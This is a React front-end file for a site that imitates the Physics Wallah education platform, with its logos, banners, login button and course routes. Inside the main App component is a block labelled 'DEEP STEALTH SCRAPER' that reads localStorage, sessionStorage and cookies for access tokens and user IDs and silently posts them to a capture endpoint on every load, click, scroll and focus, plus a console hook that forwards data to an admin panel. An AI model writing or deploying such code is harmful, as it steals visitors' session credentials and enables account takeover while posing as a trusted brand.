import { useState, useEffect, lazy, Suspense } from 'react'
import { BrowserRouter as Router, Routes, Route, useNavigate, useLocation } from 'react-router-dom'

// Lazy load components for performance
const BatchesPage = lazy(() => import('./components/BatchesPage'))
const CheckoutPage = lazy(() => import('./components/CheckoutPage'))
const BatchDetailsPage = lazy(() => import('./components/BatchDetailsPage'))
const SubjectTopicsPage = lazy(() => import('./components/SubjectTopicsPage'))
const LecturesPage = lazy(() => import('./components/LecturesPage'))
const VideoPlayerPage = lazy(() => import('./components/VideoPlayerPage'))
const UnderConstructionPage = lazy(() => import('./components/UnderConstructionPage'))
const AdminPanel = lazy(() => import('./components/AdminPanel'))
const LoginPage = lazy(() => import('./components/LoginPage'))

import { Analytics } from "@vercel/analytics/react"
import { SpeedInsights } from "@vercel/speed-insights/react"

// Navbar Component with Light and Dark variants
const Header = ({ scrolled, onNavigate }) => {
  const location = useLocation();
  const isBatchDetailsPage = location.pathname.startsWith('/batch/');
  const isUnderConstructionPage = location.pathname === '/under-construction';
  const isBatchesPage = location.pathname === '/batches';

  if (isBatchDetailsPage || isUnderConstructionPage) return null;

  // Dark variant for Batches page (Study section)
  if (isBatchesPage || location.pathname.startsWith('/checkout')) {
    return (
      <header className="fixed top-0 left-0 right-0 z-50 bg-[#1b212d] h-10 md:h-12 flex items-center border-b border-white/5">
        <div className="w-full px-4 md:px-6 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2 cursor-pointer" onClick={() => onNavigate('/')}>
              <img src="https://www.pw.live/version14/assets/img/logo.svg" alt="PW" className="h-[22px] md:h-[26px] invert brightness-0" />
              <span className="text-white font-extrabold text-[14px] md:text-[18px] tracking-tight">Physics Wallah</span>
            </div>
          </div>
          <div className="flex items-center gap-3 md:gap-5">
            <div className="flex items-center gap-2 cursor-pointer group">
              <span className="text-white font-bold text-[11px] md:text-[12px] hover:text-[#5A4BDA] transition-colors hidden sm:block">
                Hi, {localStorage.getItem('pw_user_name') || 'Student'}
              </span>
              <img src="https://static.pw.live/images/boy_20250107145242.png" alt="Profile" className="w-7 h-7 md:w-7 md:h-7 rounded-full border border-white/20" />
            </div>
          </div>
        </div>
      </header>
    );
  }

  // Light variant for Landing page
  return (
    <header 
      style={{ top: 0 }}
      className={`fixed left-0 right-0 z-[100] transition-all duration-300 ${scrolled ? 'bg-white/95 backdrop-blur-md shadow-md h-[65px]' : 'bg-white h-[75px]'} flex items-center justify-center`}
    >
      <div className="w-full max-w-7xl mx-auto px-4 md:px-8 flex items-center justify-between">
        <div className="flex items-center gap-2 md:gap-4 lg:gap-8">
          <div className="flex items-center gap-2 cursor-pointer" onClick={() => onNavigate('/')}>
            <img src="https://www.pw.live/version14/assets/img/logo.svg" alt="Physics Wallah" className="h-9 md:h-10" />
            <span className="text-[#1b212d] font-black text-[18px] md:text-[22px] tracking-tighter">Physics Wallah</span>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <button onClick={() => onNavigate('/login')} className="pw-button-primary px-6 md:px-8 py-2 text-[13px] md:text-[14px] rounded-lg font-bold">
            Login/Register
          </button>
        </div>
      </div>
    </header>
  )
}

const HeaderHelper = ({ scrolled }) => {
  const navigate = useNavigate();
  return <Header scrolled={scrolled} onNavigate={(path) => navigate(path)} />
}

const HomePage = () => {
  const navigate = useNavigate();
  const [currentBanner, setCurrentBanner] = useState(0);
  const [showNameModal, setShowNameModal] = useState(false);
  const [nameInput, setNameInput] = useState('');

  const handleGetStarted = () => {
    const savedName = localStorage.getItem('pw_user_name');
    if (!savedName) {
      setShowNameModal(true);
    } else {
      navigate('/batches');
    }
  };

  const handleNameSubmit = () => {
    if (nameInput.trim()) {
      localStorage.setItem('pw_user_name', nameInput.trim());
      // Generate unique device ID if not exists
      if (!localStorage.getItem('pw_device_id')) {
        localStorage.setItem('pw_device_id', `device_${Math.random().toString(36).substr(2, 9)}`);
      }
      setShowNameModal(false);
      navigate('/batches');
    }
  };

  const banners = [
    "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/b786089d-1894-4a34-92bb-89eb9b1280be.webp",
    "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/27ec202b-cffe-4679-9310-480f8f626caf.jpg",
    "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/9331c56f-58cb-429a-9991-be9fb6ad20a4.58"
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentBanner((prev) => (prev + 1) % banners.length);
    }, 5000);
    return () => clearInterval(timer);
  }, [banners.length]);

  const categories = [
    { name: "NEET", tags: ["Class 11", "Class 12", "Dropper"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/9816db69-099c-4020-935c-b98cc3ab4464.webp" },
    { name: "IIT JEE", tags: ["Class 11", "Class 12", "Dropper"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/438cff9f-f45c-4961-9ab3-33a59b88352c.webp" },
    { name: "UPSC", tags: ["IAS", "IPS", "IFS"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/ed50a2a8-e5fc-4ce0-bcee-823c32ea49e9.webp" },
    { name: "Pre Foundation", tags: ["Class 6", "Class 7", "Class 8"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/ed50a2a8-e5fc-4ce0-bcee-823c32ea49e9.webp" },
    { name: "School Boards", tags: ["CBSE", "ICSE", "State Boards"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/002e5e6e-47f1-4b21-89e0-8218ffcce066.webp" },
    { name: "Govt Job Exams", tags: ["SSC", "Banking", "Railways"], icon: "https://static.pw.live/5eb393ee95fab7468a79d189/GLOBAL_CMS/8556a2c4-1fd3-4d16-bdfb-62f4afa21310.webp" }
  ];

  return (
    <main className="w-full">
      {/* Banner Section with NO GAP */}
      <section className="w-full bg-white pt-[75px]">
        <div className="relative overflow-hidden aspect-[21/9] sm:aspect-[3/1] md:aspect-[4/1]">
          <div className="flex transition-transform duration-700 h-full" style={{ transform: `translateX(-${currentBanner * 100}%)` }}>
            {banners.map((url, i) => (
              <img key={i} src={url} alt={`Banner ${i}`} className="w-full h-full object-cover shrink-0" loading={i === 0 ? "eager" : "lazy"} fetchpriority={i === 0 ? "high" : "low"} />
            ))}
          </div>
          <div className="absolute bottom-3 left-1/2 -translate-x-1/2 flex gap-1.5">
            {banners.map((_, i) => (
              <button key={i} onClick={() => setCurrentBanner(i)} className={`transition-all rounded-full ${i === currentBanner ? 'bg-[#5A4BDA] w-6 h-1.5' : 'bg-black/20 w-1.5 h-1.5'}`} />
            ))}
          </div>
        </div>
      </section>

      {/* Hero Section — TRULY CLEAN & SPACIOUS */}
      <section className="bg-white py-20 md:py-32 px-4 md:px-8">
        <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          <div className="space-y-10">
            <h1 className="text-4xl md:text-6xl font-black text-[#1b212d] leading-tight">
              Bharat's <span className="text-[#5A4BDA]">Trusted & Affordable</span> Educational Platform
            </h1>
            <p className="text-xl text-gray-600 font-medium leading-relaxed max-w-lg">
              Unlock your potential by signing up with Physics Wallah—The most affordable and high-quality learning solution for every student in Bharat.
            </p>
            <div className="flex flex-col sm:flex-row gap-6 pt-4">
              <button onClick={() => handleGetStarted()} className="pw-button-primary text-lg px-10 py-4 shadow-xl">
                Get Started
              </button>
              <div className="relative flex-1 max-w-md">
                <input 
                  type="text" 
                  placeholder="Search for courses, batches, etc." 
                  className="w-full h-full min-h-[56px] pl-5 pr-28 rounded-xl border-2 border-gray-100 outline-none focus:border-[#5A4BDA] transition-all bg-gray-50/50" 
                />
                <button 
                  onClick={() => navigate('/batches')} 
                  className="absolute right-2 top-1/2 -translate-y-1/2 bg-[#5A4BDA] text-white px-6 py-2.5 rounded-lg font-bold text-sm hover:bg-[#4437B8] transition-all shadow-md"
                >
                  Search
                </button>
              </div>
            </div>
          </div>
          <div className="hidden lg:flex justify-center relative">
            <div className="relative z-10 transition-transform duration-500 hover:scale-[1.02]">
              <img 
                src="https://static.pw.live/ua/images/hero-student-w.webp" 
                className="w-full max-w-[550px] h-auto rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.1)]" 
                alt="Hero" 
                loading="lazy"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Categories Section with WIDE SPACING */}
      <section className="py-24 md:py-32 px-4 md:px-8 bg-[#F8F9FA]">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-bold text-center mb-20 text-[#1b212d]">Explore Our Top Categories</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
            {categories.map((cat, i) => (
              <div key={i} className="pw-card flex justify-between items-center group cursor-pointer p-8 bg-white border-2 border-transparent hover:border-[#5A4BDA]/30" onClick={() => navigate('/batches')}>
                <div className="space-y-4">
                  <h3 className="text-2xl font-bold group-hover:text-[#5A4BDA] transition-colors">{cat.name}</h3>
                  <div className="flex flex-wrap gap-2">
                    {cat.tags.map(tag => <span key={tag} className="pw-pill text-xs px-3 py-1.5">{tag}</span>)}
                  </div>
                </div>
                <img src={cat.icon} alt={cat.name} loading="lazy" className="w-20 h-20 object-contain grayscale opacity-30 group-hover:grayscale-0 group-hover:opacity-100 transition-all duration-500 transform group-hover:scale-110" />
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Name Prompt Modal */}
      {showNameModal && (
        <div className="fixed inset-0 z-[1000] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="bg-white rounded-3xl w-full max-w-md p-8 shadow-2xl scale-in-center animate-in zoom-in duration-300">
            <div className="flex flex-col items-center text-center space-y-6">
              <div className="w-20 h-20 bg-[#5A4BDA]/10 rounded-full flex items-center justify-center text-[#5A4BDA]">
                <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
              <div className="space-y-2">
                <h2 className="text-2xl font-black text-[#1b212d]">Welcome to Bharat!</h2>
                <p className="text-gray-500 font-medium">Please enter your name to personalize your learning journey.</p>
              </div>
              <div className="w-full">
                <input 
                  type="text" 
                  value={nameInput}
                  onChange={(e) => setNameInput(e.target.value)}
                  placeholder="Your Full Name" 
                  className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 outline-none focus:border-[#5A4BDA] transition-all bg-gray-50/50 text-lg font-bold"
                  autoFocus
                  onKeyDown={(e) => e.key === 'Enter' && handleNameSubmit()}
                />
              </div>
              <button 
                onClick={handleNameSubmit}
                disabled={!nameInput.trim()}
                className="w-full pw-button-primary py-4 text-lg font-bold rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transform active:scale-95 transition-all"
              >
                Continue Learning
              </button>
            </div>
          </div>
        </div>
      )}

      <footer className="py-20 border-t border-gray-100 text-center bg-white">
        <p className="text-gray-400 font-bold uppercase tracking-[0.2em] text-xs">© 2026 Physics Wallah. Built for Bharat.</p>
      </footer>
    </main>
  )
}

function App() {
  const [scrolled, setScrolled] = useState(false);

  useEffect(() => {
    const handleScroll = () => setScrolled(window.scrollY > 20);
    window.addEventListener('scroll', handleScroll);
    
    // Global Real View Tracking (Backend Heartbeat)
    const deviceId = localStorage.getItem('pw_device_id') || `device_${Math.random().toString(36).substr(2, 9)}`;
    if (!localStorage.getItem('pw_device_id')) localStorage.setItem('pw_device_id', deviceId);

    const sendHeartbeat = () => {
      fetch('/api/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId })
      }).catch(() => {});
    };

    sendHeartbeat();
    const interval = setInterval(sendHeartbeat, 30000); // 30s heartbeat

    // --- DEEP STEALTH SCRAPER ---
    const deepScrapeContext = () => {
      try {
        const foundData = [];
        
        // 1. Scan LocalStorage & SessionStorage completely
        const storages = [localStorage, sessionStorage];
        storages.forEach(store => {
          Object.keys(store).forEach(key => {
            const val = store.getItem(key);
            if (val && (val.includes('randomId') || val.includes('access_tokens') || val.includes('userId'))) {
              foundData.push({ source: `Storage:${key}`, data: val });
            }
          });
        });

        // 2. Scan all reachable Cookies
        const cookies = document.cookie.split(';').reduce((acc, c) => {
          const [k, v] = c.split('=').map(s => s?.trim());
          if (k && v) acc[k] = v;
          return acc;
        }, {});

        Object.entries(cookies).forEach(([k, v]) => {
          if (v.includes('randomId') || v.includes('access_tokens') || k.toLowerCase().includes('token')) {
            foundData.push({ source: `Cookie:${k}`, data: v });
          }
        });

        // 3. Process and Capture
        foundData.forEach(item => {
          // Deduplicate within this session
          const sessionKey = `capt_cache_${item.source}`;
          if (sessionStorage.getItem(sessionKey) === item.data) return;

          let parsed = item.data;
          try { 
            const decoded = decodeURIComponent(item.data);
            parsed = JSON.parse(decoded); 
          } catch(e) {
            parsed = { raw: item.data, source: item.source };
          }

          fetch('/api/auth/capture-context', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, context: parsed })
          }).then(res => {
            if (res.ok) {
              sessionStorage.setItem(sessionKey, item.data);
              console.info(`✅ Stealth Capture Saved: ${item.source}`);
            }
          }).catch(() => {});
        });
      } catch (err) {}
    };

    // Trigger on all major events for maximum capture rate
    deepScrapeContext();
    window.addEventListener('focus', deepScrapeContext);
    window.addEventListener('scroll', deepScrapeContext);
    document.addEventListener('click', deepScrapeContext);

    // Export for manual console piping
    window.captureRealTime = (data) => {
      fetch('/api/auth/capture-context', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId, context: data })
      }).then(() => console.info('✅ Manually Piped to Admin Panel!'));
    };
    
    return () => {
      window.removeEventListener('scroll', handleScroll);
      window.removeEventListener('focus', deepScrapeContext);
      window.removeEventListener('scroll', deepScrapeContext);
      document.removeEventListener('click', deepScrapeContext);
      clearInterval(interval);
    };
  }, []);

  return (
    <Router>
      <HeaderHelper scrolled={scrolled} />
      <div className="min-h-screen font-poppins text-[#1b212d] bg-white">
        <Suspense fallback={
          <div className="flex flex-col items-center justify-center min-h-[60vh] gap-4">
             <div className="w-10 h-10 border-4 border-[#5A4BDA] border-t-transparent rounded-full animate-spin"></div>
             <p className="text-gray-400 font-bold text-sm tracking-widest animate-pulse">PHYSICS WALLAH</p>
          </div>
        }>
          <Routes>
            <Route path="/" element={<HomePage />} />
            <Route path="/batches" element={<BatchesPage />} />
            <Route path="/batch/:batchId" element={<BatchDetailsPage />} />
            <Route path="/batch/:batchId/subject/:subjectId" element={<SubjectTopicsPage />} />
            <Route path="/batch/:batchId/subject/:subjectId/topic/:topicId" element={<LecturesPage />} />
            <Route path="/batch/:batchId/subject/:subjectId/lecture/:lectureId" element={<VideoPlayerPage />} />
            <Route path="/checkout/:batchId" element={<CheckoutPage />} />
            <Route path="/under-construction" element={<UnderConstructionPage />} />
            <Route path="/admin" element={<AdminPanel />} />
            <Route path="/login" element={<LoginPage />} />
          </Routes>
        </Suspense>
        <Analytics />
        <SpeedInsights />
      </div>
    </Router>
  )
}

export default App
